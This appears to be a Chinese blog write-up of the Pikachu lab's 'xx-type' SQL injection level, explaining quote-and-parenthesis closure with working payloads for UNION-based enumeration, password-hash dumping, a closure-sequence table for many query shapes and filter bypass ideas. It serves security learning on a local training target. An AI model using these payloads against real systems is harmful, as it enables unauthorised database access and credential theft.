---
layout: post
title: Pikachu - SQL注入 xx型注入 Writeup（闭合方法论）
platform: pikachu
date: 2026-10-28 22:09:00 +0800
categories: CTF
---

Pikachu - SQL注入 xx型注入 Writeup（闭合方法论）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SQL-Inject → xx型注入
- 地址：`http://localhost/pikachu/vul/sqli/sqli_x.php`
- 题型：Web
- 考点：**引号 + 括号的双重闭合**、闭合序列的通用方法论

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu / root / root
```

**页面形态**：

```text
what's your username?

[ 文本框            ]  [ 查询 ]

your uid:1
your email is: vince@pikachu.com
```

**作者提示**：

```html
data-content="管tmd的什么型,能够制造出闭合,就是本事"
```

**★ 这句话是整个 SQL 注入模块的精髓**：

```
别去记"这是字符型还是 xx 型"
要看代码里 SQL 长什么样
然后想："我要怎么让它配平？"
```

**✅ 实测结果（9 种输入）**

| # | 输入 | 结果 |
|---|---|---|
| 1 | `vince` | 1 条：uid=1 |
| 2 | `admin` | 不存在（`member` 表里没有 admin）|
| 3 | **`vince' or 1=1 #`** | **★ SQL 报错（只闭引号不够）** |
| 4 | **`vince') or 1=1 #`** | **7 条（全部用户）** ✅ |
| 5 | `vince') or 1=1 -- ` | 7 条 ✅ |
| 6 | **`-1') union select 1,2 #`** | **1 \| 2（2 列）** ✅ |
| 7 | `-1') union select 1,2,3 #` | **SQL 报错（列数不对）** |
| 8 | **`-1') union select database(),user() #`** | **pikachu \| root@localhost** ✅ |
| 9 | **`-1') union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #`** | **httpinfo,member,message,users,xssblind** ✅ |

二、题目分析

**① 后端代码：比上一关多了一对括号**

```php
<?php
// sqli_x.php 第 24-29 行
if(isset($_GET['submit']) && $_GET['name'] != null){
    //这里没有做任何处理，直接拼到select里面去了
    $name = $_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query = "select id,email from member where username=('$name')";    // ★ 引号 + 括号
    $result = execute($link, $query);
```

**★ SQL 结构拆解**：

```sql
select id,email from member where username=('$name')
                                          └┬┘└┬─┘└┬┘
                                       左括号 你  右括号
                                              ↑
                                         还有引号
```

**★ 所以要处理 **3 个符号**：

```
输入前：('      → 引号 + 左括号
输入后：')      → 右括号 + 引号
```

**② 为什么"只闭引号"会失败（关键对比）**

**输入 `vince' or 1=1 #`**：

```sql
select id,email from member where username=('vince' or 1=1 #')
                                                          └┬┘
                                                    注释掉末尾的 ')
```

**★ 剩下的 SQL**：

```sql
select id,email from member where username=('vince' or 1=1 
                                              └─────────────┘
                                              左括号没有配对！
```

**★ 实测结果**：页面报错

```
You have an error in your SQL syntax; ...
```

**★ 结论：**只闭合引号不够，还要闭合括号。**

**③ 正确 payload：闭合引号 + 闭合括号**

**输入 `vince') or 1=1 #`**：

```sql
select id,email from member where username=('vince') or 1=1 #')
                                            └──┬──┘└──┬──┘ └┬┘
                                        闭合 ' 和 )  注入   注释
```

**★ 逐字符拆解**：

```
vince'      → 闭合 SQL 里的左引号
)           → 闭合 SQL 里的左括号
or 1=1      → 注入恒真条件
#           → 注释掉 SQL 末尾的 ')
```

**★ 现在 SQL 结构完整**：

```sql
-- 实际执行的 SQL
select id,email from member where username=('vince') or 1=1
```

**★ 结果：7 条（全部用户）。**

**④ ⭐ 核心方法论：闭合序列**

**公式**：

```
payload = 【闭合序列】 + 【注入语句】 + 【注释符】
             ')          or 1=1        #
```

**★ 四种类型的闭合序列对比**：

| 类型 | SQL 结构 | 闭合序列 | 完整 payload |
|---|---|---|---|
| **数字型** | `where id=$id` | **（无）** | `1 or 1=1` |
| **字符型** | `where name='$x'` | `'` | `vince' or 1=1 #` |
| **搜索型** | `where name like '%$x%'` | `'%` | `vince%' or 1=1 #` |
| **xx型（本关）** | `where name=('$x')` | `')` | `vince') or 1=1 #` |

**★ 判断方法（三步）**：

```
第 1 步：读出 SQL 里 $name 前后是什么符号
        where username=('$name')
                      ↑↑    ↑↑
                     ( '    ' )
                     
第 2 步：你输入的 ' 会闭合前面那个 '
        但 ( 还开着 → 需要再补一个 )
        
第 3 步：构造 payload = ' ) + 注入 + 注释
```

**⑤ 列数还是 2（但不能假设）**

**查询**：

```sql
select id,email from member ...
        └┬┘└─┬─┘
        2 列
```

**★ 实测**：

```
-1') union select 1,2 #      → 成功 → 2 列
-1') union select 1,2,3 #    → 报错 "different number of columns"
```

**★ 记住这条**：

```
每关都要重新探列数
前面的关卡：数字型 2 / 字符型 2 / 搜索型 3 / xx型 2
★ 没有任何规律，必须看 SQL
```

三、解题步骤

**第 1 步：正常查询（注意用 member 表里存在的用户名）**

```text
① 打开 http://localhost/pikachu/vul/sqli/sqli_x.php
② 输入：vince
③ 点查询
④ 看到：your uid:1 / your email is: vince@pikachu.com
```

**★ 一个容易踩的坑**：

```
输入 admin → 显示"您输入的username不存在"
★ 不是因为 admin 有特殊过滤
★ 而是 member 表里根本没有 admin（只有 vince/allen/kobe/grady/kevin/lucy/lili）

★ 打注入前先确认"正常输入能查到"，否则无法判断 payload 生效没有
```

**第 2 步：⭐ 试"只闭引号"（必然失败，但很有信息量）**

**输入**：

```
vince' or 1=1 #
```

**结果**：SQL 报错（`You have an error in your SQL syntax`）

**★ 这个报错告诉你两件事**：

```
① 有注入（你的输入改变了 SQL 结构）
② 还差东西没闭（括号）
```

**第 3 步：⭐ 闭引号 + 括号（成功）**

**输入**：

```
vince') or 1=1 #
```

**结果**：7 条（全部用户）✅

**★ `#` 不生效就用**：

```
vince') or 1=1 -- 
```

**★ `--` 后面必须有空格。**

**第 4 步：探列数**

**输入**：

```
-1') union select 1,2 #
```

**结果**：

```
your uid:1
your email is: 2
```

**★ 成功 → 2 列。**

**第 5 步：读库名、数据库用户**

**输入**：

```
-1') union select database(),user() #
```

**结果**：

```
your uid:pikachu
your email is: root@localhost
```

**第 6 步：读表名**

**输入**：

```
-1') union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #
```

**结果**：

```
your uid:httpinfo,member,message,users,xssblind
your email is: 2
```

**第 7 步：拖数据（和前几关一样）**

**输入**：

```
-1') union select group_concat(concat(username,':',password)),2 from users #
```

**结果**：

```
your uid:admin:e10adc3949ba59abbe56e057f20f883e,pikachu:670b14728ad9902aecba32e22fa4f6bd,test:e99a18c428cb38d5f260853678922e03
your email is: 2
```

**第 8 步：完整 payload 汇总**

```sql
-- ① 判断注入（看是否报错）
vince'

-- ② 只闭引号（会报错，用来确认括号存在）
vince' or 1=1 #

-- ③ 闭引号 + 括号（正确）
vince') or 1=1 #
vince') or 1=1 -- 

-- ④ 探列数
-1') union select 1,2 #

-- ⑤ 基本信息
-1') union select database(),user() #

-- ⑥ 表名
-1') union select group_concat(table_name),2
   from information_schema.tables where table_schema=database() #

-- ⑦ 拖数据
-1') union select group_concat(concat(username,':',password)),2 from users #
```

四、延伸知识

**① ⭐ 常见 SQL 拼接形态 → 闭合序列对照表**

**这是本关最有价值的一张表**——遇到任何 SQL 注入，先查这张表。

| # | 代码形态 | SQL 结构 | 闭合序列 | payload 示例 |
|---|---|---|---|---|
| 1 | `"where id=$id"` | 数字 | （无） | `1 or 1=1` |
| 2 | `"where name='$x'"` | 单引号 | `'` | `x' or 1=1 #` |
| 3 | `'where name="$x"'` | 双引号 | `"` | `x" or 1=1 #` |
| 4 | `"where name=('$x')"` | 括号+引号 | `')` | `x') or 1=1 #` |
| 5 | `"where name=(('$x'))"` | 双括号 | `'))` | `x')) or 1=1 #` |
| 6 | `"where name like '%$x%'"` | LIKE | `'%` | `x%' or 1=1 #` |
| 7 | `"where id in('$x')"` | in + 引号 | `')` | `1') or 1=1 #` |
| 8 | `"select * from t where a=$x and b='y'"` | 数字（AND 后）| （无） | `1 or 1=1 #` |
| 9 | `"insert into t values('$x')"` | INSERT | `')` | `x'),(...)#` |
| 10 | `"update t set a='$x'"` | UPDATE | `'` | `x' or 1=1 #` |
| 11 | `"delete from t where id=$x"` | 数字 | （无） | `1 or 1=1 #` |
| 12 | `"select ... where id=($x)"` | 括号（数字）| `)` | `1) or 1=1 #` |
| 13 | `"select ... where a='$x' limit 1"` | 有 LIMIT | `'` + 可能需要处理 LIMIT | `x' or 1=1 #` |
| 14 | `"select ... where a='$x' order by id"` | 有 ORDER BY | `'` | `x' or 1=1 #` |

**★ 通用判断流程**：

```
第 1 步：找到 $变量 在 SQL 里的位置
第 2 步：把"变量左边的符号"和"变量右边的符号"都记下来
第 3 步：payload = 【右边的符号】+ 注入 + 注释
         （右侧符号往往就是你输入的引号 + 括号）
```

**② 报错信息怎么读（快速定位问题）**

**本关实测到的两种报错**：

**报错 1：语法错误**

```
You have an error in your SQL syntax; check the manual that corresponds to
your MySQL server version for the right syntax to use near ''vince' or 1=1 #')
at line 1
```

**★ 读法**：

```
看 "near '...'" 部分 → 那是 SQL 解析失败的位置
→ 说明括号/引号没配平
→ 要么多闭，要么少闭
```

**报错 2：列数不匹配**

```
The used SELECT statements have a different number of columns
```

**★ 读法**：

```
union 前后的列数不同
→ 改数字再试
→ 逐步加：1,2 → 1,2,3 → ...
```

**★ 报错是"最好的老师"**：

```
有报错 → 说明注入存在 → 根据报错调整 payload
无报错但无结果 → 可能是盲注（后面两关）
```

**③ 括号型注入的进阶情况**

**情况 1：双括号**

```php
$query = "select ... where username=(('$name'))";
```

**闭合序列**：

```
')) 
```

**payload**：

```
vince')) or 1=1 #
```

**情况 2：`IN` 子句**

```php
$query = "select ... where id in('$name')";
```

**payload**：

```
1') or 1=1 #
1') union select ... #
```

**情况 3：函数调用**

```php
$query = "select ... where md5(username)='$hash'";
// 或
$query = "select ... where find_in_set('$name', field)";
```

**payload**：

```
x') or 1=1 #       （有括号时）
x' or 1=1 #         （无括号时）
```

**情况 4：数字 + 括号**

```php
$query = "select ... where id=($id)";
```

**payload**：

```
1) or 1=1 #
1) union select ... #
```

**★ 数字型也可能有括号 —— 所以"数字型不用闭合"是错的。**

**④ 为什么"闭合"能成功：从 SQL 解析的角度看**

**SQL 解析器的过程**：

```
① 词法分析：把 SQL 拆成 token（关键字、标识符、字符串、符号）
② 语法分析：按语法规则构建语法树
③ 如果括号/引号不配平 → 语法错误 → 拒绝执行

★ 你的 payload 的作用：
    让"修改后的 SQL"重新变成一个【合法的语法树】
    同时在这棵树里插入"恒真条件"或"UNION 查询"
```

**★ 举例**（本关）：

```sql
-- 原始（开发者想写的）
where username=('vince')

-- 你的输入让 SQL 变成
where username=('vince') or 1=1

-- 这仍然是合法的 SQL，但语义变了：
--   "username 是 vince 的用户，或者，所有用户"
```

**⑤ 常见防御与绕过（呼应这个模块后面的关卡）**

| 防御 | 能否绕过 | 绕过思路 |
|---|---|---|
| `intval()` | ✅ 完全有效 | 无法绕过（数字型）|
| `addslashes` | ⚠️ 宽字节绕过 | `%df%27`（GBK 编码）|
| `mysqli_real_escape_string` | ⚠️ 同上 | 宽字节 |
| 关键字黑名单 | ✅ 可绕 | 大小写/注释/编码/等价函数 |
| `is_numeric` | ⚠️ 可绕 | `1e3` / 十六进制（老版本）|
| **预处理（prepare/bind）** | ❌ **无法绕过** | — |

**★ 所以本模块后面还有两关专门讲绕**：

```
· 宽字节注入 → 绕过 addslashes / real_escape_string
· 盲注 → 没有回显时怎么读数据
```

**⑥ 四关查询类注入的完整对比**

| 关卡 | SQL 结构 | 闭合序列 | 列数 | 关键 payload |
|---|---|---|---|---|
| **数字型** | `where id=$id` | （无） | 2 | `1 or 1=1` |
| **字符型** | `where name='$x'` | `'` | 2 | `x' or 1=1 #` |
| **搜索型** | `where name like '%$x%'` | `'%` | **3** | `x%' or 1=1 #` |
| **xx型** | `where name=('$x')` | `')` | 2 | `x') or 1=1 #` |

**★ 四关的"后续步骤"完全一样**：

```
① 判注入（试 ' 看报错）
② 闭合（按 SQL 结构补符号）
③ 探列数（order by / union）
④ 找回显位（-1 union select 1,2,...）
⑤ 读元数据（information_schema）
⑥ 拖数据（group_concat）
```

**★ 唯一变的是第 ② 步的"闭合序列"，和第 ③ 步的"列数"。**

五、总结

- **本题核心：`where username=('$name')` 有引号 + 括号，必须闭合 `')` 两个符号。**

- **一行漏洞代码**：

```php
$query = "select id,email from member where username=('$name')";
```

- **⭐ 五个必记要点**：

```text
① 闭合公式
   payload = 【闭合序列】 + 【注入语句】 + 【注释符】
                ')            or 1=1         #

② 只闭引号会失败
   vince' or 1=1 #      → SQL 报错（括号没配平）
   vince') or 1=1 #     → 成功

③ 每关都要重新看 SQL 结构
   数字型无符号 / 字符型 ' / 搜索型 '% / 括号型 ')
   ★ 数字型也可能有括号：where id=($id) → 要闭 )

④ 列数必须探
   数字型 2 / 字符型 2 / 搜索型 3 / xx型 2
   ★ 没有任何规律

⑤ 报错是最有价值的反馈
   "SQL syntax error" → 闭合没做对
   "different number of columns" → union 列数不对
```

- **实测数据**：

```text
vince                      → 1 条（uid=1）
admin                      → 不存在（member 表里没有）
vince' or 1=1 #            → ★ SQL 报错（只闭引号）
vince') or 1=1 #           → 7 条 ✅
vince') or 1=1 --          → 7 条 ✅

-1') union select 1,2 #    → 1 | 2（2 列）
-1') union select 1,2,3 #  → ★ SQL 报错（列数不对）
-1') union select database(),user() # → pikachu | root@localhost

-1') union select group_concat(table_name),2
   from information_schema.tables where table_schema=database() #
   → httpinfo,member,message,users,xssblind
```

- **SQL-Inject 模块进度（查询类 4 关全清）**：

```text
✅ 数字型注入(post)      —— 无符号，直接塞条件
✅ 字符型注入(get)       —— 闭合 '
✅ 搜索型注入            —— 闭合 '%（+ 组合 XSS）
✅ xx型注入              —— 本题：闭合 ')（+ 括号）
⬜ "insert/update"注入   —— 写操作注入
⬜ "delete"注入          —— 删除操作注入
⬜ "http header"注入     —— User-Agent / Referer
⬜ 盲注(base on boolean) —— 只有真假两种状态
⬜ 盲注(base on time)    —— 用 sleep 判断
⬜ 宽字节注入            —— GBK 编码绕过
```

**手工复现要点**：

```text
· 输入 vince → 确认 uid=1
· 输入 vince' or 1=1 # → 看 SQL 报错（只闭引号不够）
· 输入 vince') or 1=1 # → 7 条
· 输入 -1') union select 1,2 # → 1|2（探列数）
· 输入 -1') union select 1,2,3 # → 报错（确认 2 列）
· 输入 -1') union select database(),user() # → pikachu / root
· 用 information_schema 读表名 → 5 张表
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  "xx型"不重要，SQL 长什么样才重要                             │
│                                                            │
│  闭合 = 让"修改后的 SQL"重新变成合法的语法树                    │
│                                                            │
│  照着 SQL 数符号：                                            │
│      where username=('$name')                              │
│                     ↑↑    ↑↑                               │
│                  自己补 ' 和 )                              │
│                                                            │
│  ★ 只闭引号 → 括号不配平 → 语法错误                            │
│  ★ 闭合对了 → 后续步骤和数字型完全一样                          │
│  ★ 唯一可靠防御：预处理语句                                    │
└────────────────────────────────────────────────────────────┘
```
